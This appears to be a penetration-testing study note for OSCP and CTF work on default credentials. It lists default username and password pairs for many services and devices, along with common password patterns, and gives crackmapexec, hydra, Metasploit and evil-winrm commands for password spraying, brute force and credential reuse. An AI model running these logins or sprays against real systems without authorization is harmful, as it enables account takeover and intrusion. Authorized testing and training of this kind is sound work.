# Default Credentials

tags: #Passwords #Default_Credentials #Reference #Foundational

resources: [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), [CIRT Default Passwords](https://cirt.net/passwords)

> [!info] Common default credentials to try during penetration testing. Always attempt these before brute-forcing.

## Common Default Passwords

### Generic Defaults

```plaintext
password
password1
Password1
Password@123
password@123
admin
administrator
admin@123
root
toor
changeme
welcome
Welcome1
P@ssw0rd
P@ssword
P@ssword1
qwerty
123456
12345678
```

### Username as Password

> [!tip] Always try the username as the password first!

```plaintext
username:username
admin:admin
administrator:administrator
root:root
user:user
```

### Service-Specific Defaults

```plaintext
service:service
mysql:mysql
postgres:postgres
oracle:oracle
tomcat:tomcat
jenkins:jenkins
```

## Testing Strategy

### Step 1: Try Username:Username

```bash
# Example with SSH
ssh admin@<TargetIP>
# Password: admin

# Example with SMB
crackmapexec smb <TargetIP> -u admin -p admin
```

### Step 2: Try admin:admin

```bash
crackmapexec smb <TargetIP> -u admin -p admin
crackmapexec winrm <TargetIP> -u administrator -p administrator
```

### Step 3: Try Common Defaults

```bash
# Create password list
cat > common_defaults.txt << EOF
password
password1
Password1
admin
administrator
welcome
Welcome1
P@ssw0rd
EOF

# Spray with CrackMapExec
crackmapexec smb <TargetIP> -u admin -p common_defaults.txt
```

### Step 4: Service-Specific Defaults

> [!important] If you identify a specific service, try its default credentials.

```bash
# MySQL
mysql -h <TargetIP> -u root -p
# Password: root or blank

# PostgreSQL
psql -h <TargetIP> -U postgres
# Password: postgres or blank

# Tomcat
# Username: tomcat, admin
# Password: tomcat, admin, s3cret
```

## Application-Specific Defaults

### Web Applications

#### Tomcat

```plaintext
tomcat:tomcat
admin:admin
tomcat:s3cret
admin:s3cret
both:tomcat
```

#### Jenkins

```plaintext
admin:admin
admin:password
jenkins:jenkins
```

#### Grafana

```plaintext
admin:admin
admin:password
```

#### Kibana

```plaintext
elastic:changeme
kibana:kibana
```

### Databases

#### MySQL/MariaDB

```plaintext
root:(blank)
root:root
root:password
root:toor
mysql:mysql
```

#### PostgreSQL

```plaintext
postgres:(blank)
postgres:postgres
postgres:password
```

#### MSSQL

```plaintext
sa:(blank)
sa:sa
sa:password
sa:Password123
```

#### MongoDB

```plaintext
admin:(blank)
admin:admin
root:(blank)
```

### Network Devices

#### Cisco

```plaintext
admin:admin
cisco:cisco
admin:cisco
```

#### Juniper

```plaintext
root:(blank)
admin:admin
netscreen:netscreen
```

#### HP/3Com

```plaintext
admin:admin
manager:manager
```

### IoT/Embedded Devices

#### Raspberry Pi

```plaintext
pi:raspberry
```

#### Arduino

```plaintext
arduino:arduino
```

#### IP Cameras

```plaintext
admin:admin
admin:12345
admin:(blank)
root:root
root:12345
```

## Windows Defaults

### Local Administrator

```plaintext
Administrator:password
Administrator:Password1
Administrator:P@ssw0rd
Administrator:admin
Administrator:(blank)
```

### Common Windows Accounts

```plaintext
admin:password
admin:admin
guest:(blank)
```

### Active Directory

```plaintext
administrator:Password123
administrator:Welcome1
administrator:P@ssw0rd
administrator:Company123
```

## Linux Defaults

### Root Account

```plaintext
root:root
root:toor
root:password
root:(blank)
```

### Common User Accounts

```plaintext
admin:admin
user:user
ubuntu:ubuntu
debian:debian
```

## Remote Access Defaults

### SSH

```plaintext
root:root
admin:admin
user:user
pi:raspberry
```

### RDP

```plaintext
Administrator:password
Administrator:Password1
admin:admin
```

### VNC

```plaintext
(blank):password
admin:admin
```

### Telnet

```plaintext
admin:admin
root:root
admin:(blank)
```

## Password Patterns

### Year-Based Passwords

```plaintext
Password2024
Welcome2024
Company2024
Admin2024
```

### Season-Based Passwords

```plaintext
Spring2024
Summer2024
Fall2024
Winter2024
```

### Month-Based Passwords

```plaintext
January2024
February2024
March2024
```

### Company Name Patterns

```plaintext
<CompanyName>123
<CompanyName>2024
<CompanyName>!
<CompanyName>@123
```

## Automated Testing

### CrackMapExec Password Spray

```bash
# Create comprehensive default list
cat > defaults.txt << EOF
password
password1
Password1
Password@123
admin
administrator
welcome
Welcome1
P@ssw0rd
P@ssword1
EOF

# Spray against target
crackmapexec smb <TargetIP> -u usernames.txt -p defaults.txt --continue-on-success
```

### Hydra Brute Force

```bash
# SSH with defaults
hydra -L users.txt -P defaults.txt ssh://<TargetIP>

# RDP with defaults
hydra -L users.txt -P defaults.txt rdp://<TargetIP>

# HTTP form with defaults
hydra -L users.txt -P defaults.txt <TargetIP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### Metasploit Auxiliary Modules

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TargetIP>
set USER_FILE users.txt
set PASS_FILE defaults.txt
run
```

## Best Practices

### Testing Order

1. **Username:Username** - Most common in CTF/lab environments
2. **admin:admin** - Second most common
3. **Service defaults** - Based on identified services
4. **Common passwords** - From the list above
5. **Rockyou.txt** - Only if defaults fail

### Credential Reuse

> [!tip] If you find credentials for one service, try them everywhere!

```bash
# Found MySQL creds: root:password123
# Try on SSH
ssh root@<TargetIP>
# Password: password123

# Try on SMB
crackmapexec smb <TargetIP> -u root -p password123

# Try on WinRM
evil-winrm -i <TargetIP> -u root -p password123
```

### Documentation

> [!important] Always document which credentials work where:

```plaintext
Service: SSH
Host: 10.10.10.5
Username: admin
Password: admin
Notes: Default credentials, no password change enforced
```

## Wordlist Creation

### Generate Custom Default List

```bash
# Combine multiple sources
cat > custom_defaults.txt << EOF
password
password1
Password1
Password@123
password@123
admin
administrator
admin@123
welcome
Welcome1
Welcome@123
P@ssw0rd
P@ssword
P@ssword1
root
toor
changeme
12345678
123456
qwerty
EOF
```

### Add Year Variations

```bash
# Add current year to passwords
year=$(date +%Y)
while read pass; do
    echo "${pass}${year}"
    echo "${pass}@${year}"
done < custom_defaults.txt >> custom_defaults_year.txt
```

## Resources

- [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) - Comprehensive database
- [CIRT.net](https://cirt.net/passwords) - Vendor default passwords
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) - Default credential lists
- [RouterPasswords.com](http://www.routerpasswords.com/) - Router defaults

## OSCP Exam Considerations

> [!warning] In the OSCP exam:
> - Default credentials are rarely the answer
> - But always worth a quick check
> - Focus on enumeration and exploitation
> - Don't waste time on extensive brute-forcing

> [!tip] Quick default check workflow:
> 1. Try username:username (30 seconds)
> 2. Try admin:admin (30 seconds)
> 3. Move on to enumeration if both fail
